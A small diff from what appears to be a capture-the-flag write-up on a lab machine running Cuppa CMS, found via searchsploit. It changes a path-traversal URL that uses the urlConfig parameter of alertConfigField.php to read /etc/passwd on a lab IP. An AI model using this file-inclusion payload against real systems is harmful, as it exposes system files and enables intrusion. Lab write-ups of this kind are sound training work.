@@ -28,4 +28,4 @@ Not sure what this does, we checked the 'cuppa' using searchsploit:
 ![](../../img/Pasted%20image%2020220827205927.png)
 
 
-http://10.10.68.81/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
